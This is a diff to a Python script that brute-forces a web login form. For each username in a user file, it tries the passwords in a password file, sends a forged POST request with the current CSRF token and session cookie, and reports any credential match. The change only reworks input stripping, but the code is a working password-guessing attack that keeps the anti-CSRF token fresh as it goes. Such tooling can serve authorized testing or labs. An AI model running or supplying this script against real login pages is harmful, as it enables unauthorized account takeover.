@@ -116,7 +116,7 @@ def analyze_resp(resp):
     else:
         pass_match = True
 
-    return (next_cookie, token, pass_match)
+    return (next_cookie.strip(), token.strip(), pass_match)
 
 
 ###########################################   MAIN   #############################################
@@ -133,16 +133,19 @@ def main():
     with open(USER_FILE,"r") as u:
         with open(PASS_FILE,"r") as f:
 
-            for user in u.readlines():
+            for user_raw in u.readlines():
+                user = user_raw.strip()
 
-                for password in f.readlines():
-                    resp = forge_post(URL, token.strip(), cookie.strip(),\
-                         user.strip(), password.strip())
+                for password_raw in f.readlines():
+                    password = password_raw.strip()
+
+                    resp = forge_post(URL, token, cookie,\
+                         user, password)
                     (cookie, token, pass_match) = analyze_resp(resp)
                     
                     if pass_match:
                         print("[+] Credential match!")
-                        print(f"{user.strip()}:{password.strip()}")
+                        print(f"{user}:{password}")
 
                         break
 
